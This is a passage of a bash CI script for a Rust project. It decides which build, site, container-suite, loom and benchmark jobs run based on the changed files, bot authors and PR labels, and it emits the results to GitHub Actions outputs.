if [[ "$force_all" == "1" ]]; then
    rust=true
    site=true
    bench=true
    bench_pkgs=$(all_bench_pkgs)
    suites="$CONTAINER_PKGS"
else
    # Fill the discovery cache here, in the parent shell: the loop below asks
    # `bench_pkgs_for` about every changed crate from inside a command
    # substitution, and a subshell cannot write the answer back.
    discover_bench_pkgs
    while IFS= read -r -d '' file; do
        [[ -z "$file" ]] && continue

        # First match wins, and the order is load-bearing. In a bash `case`
        # pattern `*` matches `/` as well, so a bare `*.md` arm would also
        # swallow crates/spate/README.md — and a crate README can be compiled
        # into the library with `#![doc = include_str!(...)]`. Claiming the
        # source trees first is what keeps the prose arm honest.
        case "$file" in
        # Source trees: always code, whatever the file extension. Empty body,
        # so control falls past the `case` to the classification below.
        #
        # `crates/*` is split out because it selects the site as well. A docs
        # page's Rust snippets are not written in the page — they are regions of
        # a file under `crates/`, resolved at site-build time by
        # website/src/remark/transclude.ts. An edit under `crates/` can
        # therefore change a rendered page without touching `docs/` at all, and
        # before this arm existed such a pull request never built the site.
        #
        # Deliberately the whole tree rather than the paths some page names
        # today. A `file=` attribute may point anywhere under `crates/`, so a
        # narrower list goes stale the first time a page quotes something new —
        # and it goes stale by failing OPEN, which is the failure mode the
        # ignore-list shape at the top of this file exists to avoid. The site
        # build is the cheap tier; a Rust pull request already pays for the
        # test, feature and MSRV matrices, which dwarf it.
        crates/*)
            site=true
            ;;
        scripts/* | bench/*) ;;
        # CI definitions decide what every other job does, so a change to one
        # has to be exercised by the full set.
        .github/workflows/* | .github/actions/*) ;;
        # The rest of `.github/` cannot reach a Rust build or the site.
        # Dependabot config and issue templates are still audited, because
        # zizmor scans all of `.github/` and never carries a filter.
        .github/*)
            continue
            ;;
        # --- documentation and site sources: no Rust build needed ------------
        docs/* | website/*)
            site=true
            continue
            ;;
        # Root-level prose and repo furniture.
        *.md | LICENSE | .gitignore | .dockerignore)
            continue
            ;;
        esac

        # --- everything else is code ----------------------------------------
        rust=true

        # Which container suites can this file reach?
        case "$file" in
        crates/*)
            crate="${file#crates/}"
            crate="${crate%%/*}"
            suites="$suites $(container_suites_for "$crate")"
            ;;
        # A dependency or lint change moves the whole graph. So does a change to
        # the workflows, the composite action, the Makefile the workflow steps
        # call, or this script — the last one decides what runs at all, so it
        # has to prove itself against everything.
        Cargo.lock | Cargo.toml | deny.toml | rust-toolchain.toml | .config/* | \
            .github/workflows/* | .github/actions/* | scripts/* | Makefile)
            suites="$suites $CONTAINER_PKGS"
            site=true
            ;;
        esac

        # Which files can move an instruction count, and whose benches
        # should run because of it? The unit is the whole crate, not the
        # module a bench happens to import, because codegen is crate-global —
        # an edit anywhere in a measured crate can shift inlining and with it
        # the count.
        #
        # `bench_pkgs_for` answers from what the benches discover: a benched
        # crate selects itself, spate-core selects every benched crate because
        # every crate depends on it, and a crate with no bench selects nothing.
        # Adding a bench wires it into pull-request selection without an edit
        # here, which is what keeps this file from naming a subset of the
        # benches that exist.
        #
        # Cost is bounded by the reach of the change rather than by a list: a
        # change confined to one benched crate pays for that crate's two builds
        # and two valgrind runs, and only a change to the crate everything
        # depends on pays for all of them. The `ci: bench` label is still how a
        # path that selects less asks for the full set.
        #
        # A separate `case` rather than arms on the one above, because the
        # two questions have different answers for the same file.
        case "$file" in
        crates/*)
            crate="${file#crates/}"
            crate="${crate%%/*}"
            selected=$(bench_pkgs_for "$crate")
            if [[ -n "$selected" ]]; then
                bench=true
                bench_pkgs="$bench_pkgs $selected"
            fi
            ;;
        # The measuring apparatus itself. A change to what gets discovered,
        # which crates are chosen, how the results are read, or the job that
        # drives them can alter the outcome for every crate, so it selects all
        # of them. This file is on the list because it is the chooser: an edit
        # here can leave every later pull request measuring the wrong set.
        #
        # This is not symmetry for its own sake: without it, the pull request
        # that rewrites how benches are chosen is precisely the one that never
        # runs them. That happened — the change introducing the discovery
        # script landed its bench job as `skipped`, because the paths that
        # force the whole container graph do not touch `bench`, and nothing
        # said so.
        #
        # `.github/actions/` is on the list because the shared build cache is
        # configured there, and which cache a shard restores decides whether it
        # compiles the bench graph from scratch — a change that can move every
        # crate's job, without touching a crate.
        scripts/ci-changes.sh | scripts/gungraun-benches.sh | \
            scripts/gungraun-report.sh | scripts/gungraun-collected-region.sh | \
            .github/workflows/ci.yml | .github/actions/*)
            bench=true
            bench_pkgs="$bench_pkgs $(all_bench_pkgs)"
            ;;
        esac
    done <"$changed_file"
fi

# A dependency bump touches Cargo.lock, which by the rule above reaches every
# container suite — so an unmodified Dependabot week would boot SeaweedFS, NATS,
# Kafka and ClickHouse once per bump, and again on every rebase when a sibling
# PR merges. These pull requests keep the whole cheap tier (lint, deny, the full
# test suite, each-feature, MSRV) and give up only the container suites, which
# the push-to-main run re-runs in full minutes after the merge.
if [[ "${PR_AUTHOR:-}" == "dependabot[bot]" && "${EVENT_NAME:-}" == "pull_request" ]]; then
    echo "note: dependabot pull request; container suites deferred to push-to-main."
    suites=""
fi

# The release pull request release-plz keeps open against `main` is the same
# trade at a better price. Its whole diff is `Cargo.toml` and `Cargo.lock`, which
# the dependency rule above answers with every container suite — so the cheapest
# diff this classifier ever sees gets the most expensive classification it has.
# And it gets it repeatedly: release-plz rewrites that branch on every push to
# `main`, so the boots are paid once per merge, not once per release.
#
# The safety argument is stronger here than for Dependabot. A bump changes real
# dependency code; this branch's source tree is byte-identical to the `main`
# commit that just ran the container suites on push. What is new is version
# strings, and what those can break is covered without a container: an
# inconsistent `=` internal pin or a lock file stale against the manifests fails
# the lint, test, MSRV and each-feature tiers, all of which run `--locked`, and
# the public-API diff is `semver_check` in release-plz.toml, which runs while the
# pull request is composed rather than on it.
if [[ "${PR_AUTHOR:-}" == "spate-release[bot]" && "${EVENT_NAME:-}" == "pull_request" ]]; then
    echo "note: release pull request; container suites deferred to push-to-main."
    suites=""
fi

# Applied after the deferrals above, so labelling a Dependabot or release pull
# request `ci: docker` overrides one for that one bump.
before_labels="$suites"
suites=$(apply_ci_labels "${PR_LABELS:-}" "$suites")
if [[ "$suites" != "$before_labels" ]]; then
    echo "note: 'ci: docker' label present; container suites forced on."
fi

loom=false
if ci_label_wants_loom "${PR_LABELS:-}"; then
    echo "note: 'ci: loom' label present; loom models forced on."
    loom=true
fi

if ci_label_wants_bench "${PR_LABELS:-}"; then
    echo "note: 'ci: bench' label present; instruction counts forced on."
    bench=true
    bench_pkgs=$(all_bench_pkgs)
fi

# Deduplicate: a pull request touching several files in one measured crate
# accumulates it once per file, and each duplicate would be a repeated bench
# run.
bench_pkgs_out=""
if [[ -n "${bench_pkgs// /}" ]]; then
    bench_pkgs_out=$(echo "$bench_pkgs" | tr ' ' '\n' | grep -v '^$' | sort -u | tr '\n' ' ')
    bench_pkgs_out="${bench_pkgs_out% }"
fi

# Cross the selection with the arm table. An empty `include:` is a workflow
# *error* rather than a skipped job, so the boolean and the array have to agree
# — `bench` is only ever set true alongside a non-empty selection today, and
# this keeps that true by construction rather than by inspection.
bench_shards=$(bench_shards_json "$bench_pkgs_out")
if [[ "$bench_shards" == "[]" ]]; then
    bench=false
fi

# Deduplicate and render as cargo -p arguments.
container_args=""
if [[ -n "${suites// /}" ]]; then
    for pkg in $(echo "$suites" | tr ' ' '\n' | grep -v '^$' | sort -u); do
        container_args="$container_args -p $pkg"
    done
    container_args="${container_args# }"
fi

# ---------------------------------------------------------------------------
# Emit.
# ---------------------------------------------------------------------------
{
    echo "rust=$rust"
    echo "site=$site"
    echo "containers=$([[ -n "$container_args" ]] && echo true || echo false)"
    echo "container-args=$container_args"
    echo "loom=$loom"
    echo "bench=$bench"
    # One line of JSON, and one line only: `$GITHUB_OUTPUT` is a key=value
    # file, so a multi-line value would need heredoc delimiters and a value
    # containing the delimiter is a known output-injection vector.
    echo "bench-shards=$bench_shards"
} | tee -a "${GITHUB_OUTPUT:-/dev/stdout}"
